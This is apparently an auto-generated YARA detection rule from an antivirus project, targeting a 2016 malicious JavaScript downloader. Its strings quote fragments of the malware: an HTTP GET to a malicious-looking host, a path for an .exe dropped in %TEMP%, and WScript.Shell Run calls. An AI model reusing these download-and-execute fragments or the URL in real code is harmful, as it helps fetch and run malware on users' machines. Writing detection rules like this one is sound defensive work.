rule sig_20160329_03f515b4cb6d1bb099d01ab3e59442f5 {
  meta:
    description = "datamaliciousorder - file 20160329_03f515b4cb6d1bb099d01ab3e59442f5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "712a77eae765e873b6d5dc1f8fafac39fc4f51a91219e1c4daad439a8c213daa"

  strings:
    $s1  = "pt[lV](\"GET\", \"http://dealingdeuces.com/o4pskd\", false);" fullword ascii
    $s2  = "function T() {return Q0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"phLkGoD7HrF.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[e](Vr() * 11); if (pt[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Q0 = function og() {return WScript[K](\"WScript.Shell\");}(), Eu = 11;" fullword ascii
    $s5  = "function FN(L, xB){Z = Z * 1; return L - xB;};" fullword ascii
    $s6  = "function D(){return \"\" + w;};" fullword ascii
    $s7  = "function Y() {return ((j == true) && (j == lo)) ? 1 : Z;};" fullword ascii
    $s8  = "function dC(DV){Q0[\"Run\"](DV, Z, Z);};" fullword ascii
    $s9  = " while (a){" fullword ascii
    $s10 = "function Vr(){return 22;};" fullword ascii
    $s11 = "return FN(eT, zW);" fullword ascii
    $s12 = "function g(un) {var Cg = (1, 2, 3, 4, 5, un); return Cg;};" fullword ascii
    $s13 = "function rb()" fullword ascii
    $s14 = "function C(){return K;};" fullword ascii
    $s15 = "var Gm = new this[\"Date\"]();" fullword ascii
    $s16 = "var lo = false;" fullword ascii
    $s17 = "var j = false;" fullword ascii
    $s18 = "lo = true; " fullword ascii
    $s19 = "j = true; " fullword ascii
    $s20 = "} catch(Fo){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}